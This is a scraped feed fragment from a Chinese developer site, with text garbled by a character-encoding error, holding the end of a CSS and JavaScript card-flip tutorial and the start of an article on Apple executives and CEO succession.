100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä¸€ã€ä¸¤ç§ç¿»è½¬æ–¹å¼ï¼š</h2>
<h3 data-id="heading-1">ç»“æ„</h3>
<pre><code class="hljs language-ini" lang="ini">&lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;
	&lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"front"</span>&gt;æ­£é¢&lt;/div&gt;
	&lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"back"</span>&gt;èƒŒé¢&lt;/div&gt;
&lt;/div&gt;
&lt;button <span class="hljs-attr">class</span>=<span class="hljs-string">"flip"</span>&gt;ç¿»è½¬&lt;/button&gt;
</code></pre>
<h3 data-id="heading-2"><strong>é¼ æ ‡æ‚¬åœ</strong>ï¼šé€šè¿‡CSSçš„<code>:hover</code>ä¼ªç±»å®ç°</h3>
<ol>
<li><strong>transform-style: preserve-3d</strong>ï¼šè¿™æ˜¯3Då˜æ¢çš„å…³é”®ï¼Œç¡®ä¿å­å…ƒç´ åœ¨3Dç©ºé—´ä¸­å˜æ¢ï¼Œè€Œä¸æ˜¯è¢«å‹æ‰åˆ°2Då¹³é¢</li>
<li><strong>backface-visibility: hidden</strong>ï¼šéšè—å…ƒç´ çš„èƒŒé¢ï¼Œè¿™æ˜¯å®ç°"å¡ç‰‡ç¿»è½¬"æ•ˆæœè€Œé"å†…å®¹é•œåƒ"çš„å…³é”®</li>
<li><strong>.back { transform: rotateY(180deg); }</strong> ï¼šèƒŒé¢åˆå§‹æ—‹è½¬180åº¦ï¼Œä½¿å…¶æœåéšè—</li>
<li><strong>transition: transform 0.6s</strong>ï¼šä¸ºtransformå±æ€§æ·»åŠ 0.6ç§’çš„è¿‡æ¸¡åŠ¨ç”»ï¼Œä½¿ç¿»è½¬è¿‡ç¨‹å¹³æ»‘</li>
</ol>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.card</span> {
		<span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
		<span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
		<span class="hljs-attribute">position</span>: relative;  <span class="hljs-comment">/* è®¾ç½®ä¸ºç›¸å¯¹å®šä½ï¼Œä½œä¸ºå­å…ƒç´ çš„å®šä½åŸºå‡† */</span>
		<span class="hljs-attribute">transform-style</span>: preserve-<span class="hljs-number">3</span>d;  <span class="hljs-comment">/* ä¿æŒ3Då˜æ¢æ•ˆæœï¼Œä½¿å­å…ƒç´ åœ¨3Dç©ºé—´å†…å˜æ¢ */</span>
		<span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.6s</span>;  <span class="hljs-comment">/* æ·»åŠ transformå±æ€§çš„è¿‡æ¸¡æ•ˆæœï¼ŒæŒç»­0.6ç§’ */</span>
	}
	<span class="hljs-selector-class">.front</span>, <span class="hljs-selector-class">.back</span> {
		<span class="hljs-attribute">position</span>: absolute;  <span class="hljs-comment">/* ç»å¯¹å®šä½ï¼Œä½¿æ­£åé¢é‡å  */</span>
		<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">backface-visibility</span>: hidden;  <span class="hljs-comment">/* éšè—å…ƒç´ çš„èƒŒé¢ï¼Œé˜²æ­¢ç¿»è½¬æ—¶çœ‹åˆ°é•œåƒå†…å®¹ */</span>
	}
	<span class="hljs-comment">/* æ­£é¢æ ·å¼ */</span>
	<span class="hljs-selector-class">.front</span> {
		<span class="hljs-attribute">background-color</span>: lightgreen;  <span class="hljs-comment">/* æ­£é¢èƒŒæ™¯è‰²ä¸ºæµ…ç»¿è‰² */</span>
	}
	<span class="hljs-comment">/* èƒŒé¢æ ·å¼ */</span>
	<span class="hljs-selector-class">.back</span> {
		<span class="hljs-attribute">background-color</span>: lightblue;  <span class="hljs-comment">/* èƒŒé¢èƒŒæ™¯è‰²ä¸ºæµ…è“è‰² */</span>
		<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">180deg</span>);  <span class="hljs-comment">/* åˆå§‹çŠ¶æ€æ—‹è½¬180åº¦ï¼Œä½¿èƒŒé¢æœåéšè— */</span>
	}
	<span class="hljs-comment">/* é¼ æ ‡æ‚¬åœæ•ˆæœ */</span>
	<span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> {
		<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">180deg</span>);  <span class="hljs-comment">/* é¼ æ ‡æ‚¬åœæ—¶ï¼Œå¡ç‰‡æ²¿Yè½´æ—‹è½¬180åº¦ */</span>
	}
</code></pre>
<h3 data-id="heading-3"><strong>æŒ‰é’®ç‚¹å‡»</strong>ï¼šé€šè¿‡JavaScriptäº‹ä»¶ç›‘å¬å®ç°</h3>
<ol>
<li>
<p>é€šè¿‡<code>querySelector</code>è·å–å¡ç‰‡å’ŒæŒ‰é’®å…ƒç´ </p>
</li>
<li>
<p>ä¸ºæŒ‰é’®æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨</p>
</li>
<li>
<p>ä½¿ç”¨æ¡ä»¶è¿ç®—ç¬¦åˆ‡æ¢å¡ç‰‡çš„ç¿»è½¬çŠ¶æ€ï¼š</p>
<ul>
<li>å¦‚æœå¡ç‰‡å·²æœ‰transformæ ·å¼ï¼Œåˆ™æ¸…é™¤ï¼ˆè¿”å›æ­£é¢ï¼‰</li>
<li>å¦‚æœå¡ç‰‡æ²¡æœ‰transformæ ·å¼ï¼Œåˆ™æ·»åŠ <code>rotateY(180deg)</code>ï¼ˆç¿»è½¬æ˜¾ç¤ºèƒŒé¢ï¼‰</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">	<span class="hljs-comment">// è·å–DOMå…ƒç´ </span>
	<span class="hljs-keyword">let</span> card = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.card'</span>);  <span class="hljs-comment">// è·å–å¡ç‰‡å…ƒç´ </span>
	<span class="hljs-keyword">let</span> flip = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.flip'</span>);  <span class="hljs-comment">// è·å–ç¿»è½¬æŒ‰é’®å…ƒç´ </span>
	
	<span class="hljs-comment">// ä¸ºç¿»è½¬æŒ‰é’®æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨</span>
	flip.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
		<span class="hljs-comment">// æ¡ä»¶åˆ¤æ–­ï¼šå¦‚æœå¡ç‰‡å½“å‰æœ‰transformæ ·å¼ï¼Œåˆ™æ¸…é™¤ï¼ˆæ¢å¤æ­£é¢ï¼‰</span>
		<span class="hljs-comment">// å¦‚æœå¡ç‰‡å½“å‰æ²¡æœ‰transformæ ·å¼ï¼Œåˆ™æ·»åŠ ç¿»è½¬æ ·å¼ï¼ˆæ˜¾ç¤ºèƒŒé¢ï¼‰</span>
		card.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> ? card.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">''</span> : card.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">'rotateY(180deg)'</span>;
	});
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åº“å…‹å‘Šåˆ«è‹¹æœï¼Œã€Œä¹å­å¤ºå«¡ã€äº‰å¤º CEO å¤§æˆ˜å¼€å§‹äº†]]></title>    <link>https://juejin.cn/post/7580674010838532142</link>    <guid>https://juejin.cn/post/7580674010838532142</guid>    <pubDate>2025-12-08T02:53:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838532142" data-draft-id="7580674010838499374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åº“å…‹å‘Šåˆ«è‹¹æœï¼Œã€Œä¹å­å¤ºå«¡ã€äº‰å¤º CEO å¤§æˆ˜å¼€å§‹äº†"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2025-12-08T02:53:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–°æ™ºå…ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åº“å…‹å‘Šåˆ«è‹¹æœï¼Œã€Œä¹å­å¤ºå«¡ã€äº‰å¤º CEO å¤§æˆ˜å¼€å§‹äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–°æ™ºå…ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:53:09.000Z" title="Mon Dec 08 2025 02:53:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6423550ef1864833b23d68c6e4336a20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=ILhuxamNzgfct%2F1uv6zoEyp%2BRSo%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>ã€Œã€æ–°æ™ºå…ƒå¯¼è¯»ã€‘è‹¹æœé«˜å±‚å¤§åœ°éœ‡ï¼65 å²çš„åº“å…‹å¼€å§‹æ‰‹æŠ–ï¼Œä½è°ƒçš„ä»–æ„å›¾å¼•é€€ï¼Œè€Œç•™ä¸‹æ¥çš„ï¼Œæ˜¯ã€Œåº“å…‹å†…é˜ã€çš„æ¿€çƒˆå®«æ–—ï¼Œæœ€æ–°è¿›å±•æ˜¯ M ç³»åˆ—èŠ¯ç‰‡ä¹‹çˆ¶è¯·è¾ï¼Œåº“å…‹æ¬²è®¾ç«‹ CTO ç•™ä¸‹ä»–ã€‚iPod ä¹‹çˆ¶ä¹Ÿå¼€å§‹é€ åŠ¿è‡ªå·±æ˜¯æœ€é€‚åˆæ¥ä»»è‹¹æœ CEO çš„é‚£ä¸ªäººã€‚ã€</strong></h5>
<p>2025 å¹´çš„åŠ å·åº“æ¯”è’‚è¯ºï¼Œé˜³å…‰ä¾æ—§æ¯«ä¸åå•¬åœ°æ´’åœ¨ Apple Park å·¨å¤§çš„æ›²é¢ç»ç’ƒä¸Šã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29efd9d61e6f492aa81c6bb053200956~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=3pLb5OH0hjac7V%2FRX6tHOhvJuUI%3D" alt="" loading="lazy"/></p>
<p>è¿™åº§é€ ä»· 50 äº¿ç¾å…ƒã€è¢«ä¹”å¸ƒæ–¯è§†ä½œç”Ÿå¹³æœ€åä¸€ä»¶ä½œå“çš„ç¯å½¢å»ºç­‘ï¼Œå®›å¦‚ä¸€è‰˜åœæ³Šåœ¨åœ°çƒè¡¨é¢çš„å¤–æ˜Ÿé£èˆ¹ï¼Œè±¡å¾ç€ä¸€ç§è¿‘ä¹ç¥æ€§çš„å®Œç¾ç§©åºã€‚</p>
<p>åœ¨è¿™é‡Œï¼ŒåŒ…è£…ç›’çš„è®¾è®¡éƒ½æ‹¥æœ‰ä¸“åˆ©ï¼Œæ¯ä¸€æ£µæ ‘çš„ç§æ¤ä½ç½®éƒ½ç»è¿‡ç²¾ç¡®è®¡ç®—ï¼Œç©ºæ°”ä¸­å¼¥æ¼«ç€ä¸€ç§å¯¹ã€Œæ§åˆ¶ã€çš„æè‡´è¿·æ‹ã€‚</p>
<p>ç„¶è€Œï¼Œåœ¨è¿™ä¸ªè¢«è§†ä¸ºç§‘æŠ€ç•Œã€Œæ¢µè’‚å†ˆã€çš„åœ£åœ°å†…éƒ¨ï¼Œä¸€ç§ä¸æ˜“å¯Ÿè§‰å´è‡´å‘½çš„åŠ¨è¡æ­£åœ¨è”“å»¶ã€‚</p>
<p>é‚£äº›æ›¾å°†è‹¹æœå·¥ç‰Œè§†ä¸ºèŒä¸šç”Ÿæ¶¯æœ€é«˜å‹‹ç« çš„é¡¶å°–å·¥ç¨‹å¸ˆã€è®¾è®¡å¸ˆå’Œæ¶æ„å¸ˆï¼Œæ­£åœ¨æˆç¾¤ç»“é˜Ÿåœ°å¯»æ‰¾ã€Œæ•‘ç”Ÿèˆ±ã€ã€‚</p>
<p>ä»–ä»¬å¹¶ä¸æ˜¯å› ä¸ºè¿™é‡Œå¾…é‡å¾®è–„è€Œç¦»å¼€ï¼Œä¹Ÿä¸æ˜¯å› ä¸ºåŒå€¦äº†åŠ å·çš„é˜³å…‰ã€‚</p>
<p>ä»–ä»¬ç¦»å¼€ï¼Œæ˜¯å› ä¸ºæ„Ÿè§‰è¿™è‰˜é£èˆ¹è™½ç„¶ä¾æ—§èˆªè¡Œå¹³ç¨³ï¼Œä½†ä¼¼ä¹å·²ç»åç¦»äº†é€šå¾€æœªæ¥çš„èˆªçº¿ã€‚</p>
<p>ä»–ä»¬é©±è½¦å‘åŒ—ï¼Œç©¿è¿‡ 280 å·å·é™…å…¬è·¯ï¼Œæ¶Œå‘äº† Meta ä½äºé—¨æ´›å¸•å…‹çš„å›­åŒºï¼Œæˆ–æ˜¯æ—§é‡‘å±±é‚£ä¸ªå……æ–¥ç€æå®¢ä¸ç†æƒ³ä¸»ä¹‰çš„ OpenAI æ€»éƒ¨ã€‚</p>
<p>è¿™æ˜¯ä¸€åœºå…³ä¹ä¿¡ä»°çš„è¿å¾™ã€‚</p>
<p>æ ¹æ®å½­åšç¤¾ã€åå°”è¡—æ—¥æŠ¥ç­‰å¤šæ–¹ä¿¡æºçš„äº¤å‰å°è¯ï¼Œè‹¹æœæ­£åœ¨ç»å†è‡ª 1997 å¹´ä¹”å¸ƒæ–¯å›å½’ä»¥æ¥æœ€ä¸¥é‡çš„äººæ‰æµå¤±æ½®ã€‚</p>
<p>ä»å®šä¹‰äº† iPhone è§¦æ„Ÿçš„è®¾è®¡å¸ˆï¼Œåˆ°æŒæ§ç€å…¨çƒæ•°äº¿å°è®¾å¤‡ç®—åŠ›å‘½è„‰çš„èŠ¯ç‰‡é€ ç‰©ä¸»ï¼Œå†åˆ°è¯•å›¾åœ¨ç”Ÿæˆå¼ AI æµªæ½®ä¸­çªå›´çš„ç®—æ³•ä¸“å®¶ï¼Œç¦»èŒåå•ä¸Šçš„æ¯ä¸€ä¸ªåå­—ï¼Œéƒ½è¶³ä»¥è®©ç«äº‰å¯¹æ‰‹çš„çŒå¤´åœ¨æ·±å¤œå…´å¥‹å¾—å¤±çœ ã€‚</p>
<p>å¦‚æœè¯´è¿‡å»äºŒåå¹´ï¼Œç¡…è°·çš„äººæ‰å¼•åŠ›åœºä¸­å¿ƒåœ¨åº“æ¯”è’‚è¯ºï¼Œé‚£ä¹ˆç°åœ¨ï¼Œè¿™ä¸ªå¼•åŠ›åœºæ­£åœ¨å‘ç”Ÿå‰§çƒˆçš„ç£æç¿»è½¬ã€‚</p>
<p>è¿™æ˜¯ç§‘æŠ€å†å²è½¦è½®è½¬å‘æ—¶å‘å‡ºçš„åˆºè€³æ‘©æ“¦å£°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/637cbcfb04a74cc5a6cfb4e27f49416c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=8Q2CTyg7fJb%2FgTbLFJXX9Fx4iWw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç¬¬ä¸€ç« ï¼šè®¾è®¡çµé­‚çš„ã€ŒåŒ—ä¼ã€ã€</strong></p>
<p><strong>ã€Œå½“å®Œç¾ä¸»ä¹‰é­é‡ç”Ÿæˆå¼æ··æ²Œã€</strong></p>
<p>åœ¨è‹¹æœï¼Œè®¾è®¡å›¢é˜Ÿï¼ˆIndustrial Design &amp; Human Interfaceï¼‰ä¸ä»…ä»…æ˜¯ä¸€ä¸ªéƒ¨é—¨ï¼Œå®ƒæ˜¯è¿™å®¶å…¬å¸çš„çµé­‚ï¼Œæ˜¯å‡Œé©¾äºå·¥ç¨‹å’Œè´¢åŠ¡ä¹‹ä¸Šçš„æœ€é«˜æ„å¿—ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ä¸ªæ›¾ç»é“æ¿ä¸€å—çš„ç²¾è‹±ä¿±ä¹éƒ¨ï¼Œå¦‚ä»Šå´æˆäº†äººæ‰æµå¤±çš„é‡ç¾åŒºã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0601e0faac6943af9f4b6af938773357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767189&amp;x-signature=97F3SyX3Alkw%2BNaVh%2BGVao23v5E%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œ1.1 è‰¾ä¼¦ Â· æˆ´çš„è½¬èº«ï¼Œä¸ Meta çš„è±ªèµŒã€</strong></p>
